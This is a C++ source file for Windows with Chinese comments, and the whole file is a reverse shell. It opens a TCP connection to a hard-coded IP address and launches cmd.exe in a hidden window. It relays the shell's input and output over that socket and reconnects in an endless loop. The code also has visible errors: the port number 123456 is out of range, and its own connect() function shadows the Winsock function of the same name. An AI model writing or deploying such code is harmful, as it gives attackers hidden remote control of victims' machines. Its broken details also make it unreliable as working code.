#include <stdio.h>
#include <Windows.h>
#pragma comment(lib,"WS2_32")
int connect()
{
	try{
		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);

		SOCKET s;
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		sockaddr_in sockaddr;
		sockaddr.sin_family = AF_INET;
		sockaddr.sin_addr.S_un.S_addr = inet_addr("192.168.204.1");
		sockaddr.sin_port = htons(123456);
		connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));

		HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2; //四个HANDLE 用来创建两个管道
		CHAR Buff[2048] = { 0 };
		CHAR sendBuff[2048] = { 0 };

		SECURITY_ATTRIBUTES sa;
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = 0;
		sa.bInheritHandle = true;
		int ret;
		if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0)){
			return -1;
		}
		if (!CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0)){
			return -1;
		}

		//启动信息
		STARTUPINFOA si;
		ZeroMemory(&si, sizeof(si));
		//GetStartupInfo(&si);
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;
		si.hStdInput = hReadPipe2;
		si.hStdOutput = si.hStdError = hWritePipe1;
		char cmdLine[256] = { 0 };
		GetSystemDirectoryA(cmdLine, sizeof(cmdLine));
		strcat(cmdLine, "\\cmd.exe");

		PROCESS_INFORMATION ProcessInformation;
		if (CreateProcessA(cmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &ProcessInformation) == 0){
			return -1;
		}
		unsigned long lBytesRead, lBytesWrite;//读写数量存放变量
		//WriteFile(hWritePipe2, "\r\n", 2, &lBytesWrite, 0);
		while (TRUE) {
			lBytesRead = 0;
			ZeroMemory(Buff, sizeof(Buff));
			ret = PeekNamedPipe(hReadPipe1, Buff, 2048, &lBytesRead, 0, 0);
			memset(Buff, 0, sizeof(Buff));
			ret = ReadFile(hReadPipe1, Buff, 2048, &lBytesRead, 0);
			send(s, Buff, strlen(Buff) + sizeof(char), NULL);

			WriteFile(hWritePipe2, "\r\n", 2, &lBytesWrite, 0);
			//Sleep(100);
			ret = ReadFile(hReadPipe1, Buff, 2048, &lBytesWrite, 0);//读取管道里的数据
			//读入输入数据  以回车结束
			ZeroMemory(sendBuff, sizeof(sendBuff));

			if (recv(s, sendBuff, MAXBYTE, 0) <= 0) {
				//PostThreadMessage(ProcessInformation.dwThreadId, WM_QUIT, 0, 0);
				TerminateProcess(ProcessInformation.hProcess, 0);
				//PostMessage(ProcessInformation.hProcess, WM_CLOSE, 0, 0);
				break;
			}

			if (!WriteFile(hWritePipe2, sendBuff, sizeof(sendBuff), &lBytesWrite, 0)){
				TerminateProcess(ProcessInformation.hProcess, 0);
				return -1;
			}

			Sleep(100);
		}

	}
	catch (const char *msg){
		printf("Listen  Error ... \n");
		printf(" msg = %s \n", msg);
		exit(0);
	}


}
int main()
{
	while (true){
		connect();
	}
	return 0;
}